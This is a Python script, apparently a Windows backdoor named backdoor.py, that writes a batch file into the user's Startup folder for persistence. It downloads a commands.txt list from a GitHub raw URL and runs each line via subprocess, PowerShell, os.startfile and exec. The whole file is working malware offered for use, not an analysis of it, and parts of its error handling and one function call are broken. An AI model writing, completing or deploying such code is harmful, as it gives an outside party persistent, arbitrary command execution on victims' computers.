import requests
import os
import subprocess
import getpass

user = getpass.getuser()
current_dir = os.path.dirname(os.path.abspath(__file__))
startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

def make_startup_file():
    batch_file = f"""
    @echo off
    start "" /min "python {current_dir}\\backdoor.py"
    exit /b 0
    """

    with open(f"{startup_path}\\startup.bat", "w") as f:
        f.write(batch_file)

def install(url: str, filename: str, path: str | None) -> None:
    r"""path cannot end with \ """
    if not url.startswith("https://raw"):
        return
    
    raw_file = requests.get(url)
    raw_file.raise_for_status()

    if path is None:
        with open(filename, "w") as f:
            f.write(raw_file.text)
    else:
        with open(f"{path}\\{filename}") as f:
            f.write(raw_file.text)

if not os.path.exists(f"C:\\Users\\{user}\\commands.txt"):
    install("https://raw.githubusercontent.com/thomhanson/idk/refs/heads/main/commands.txt", "commands.txt", f"C:\\Users\\{user}")

if not os.path.exists(f"{startup_path}\\startup.bat"):
    make_startup_file()

with open(f"C:\\Users\\{user}\\commands.txt", "r") as reader:
    commands = reader.readlines()

for command in commands:
    try:
        subprocess.run(command)
    except subprocess.SubprocessError or OSError:
        try:
            subprocess.run(f'powershell -command "{command}"')
        except subprocess.SubprocessError or OSError:
            try:
                os.startfile(command)
            except FileNotFoundError or OSError:
                try:
                    exec(command)
                except Exception:
                    try:
                        install(command)
                    except Exception:
                        pass
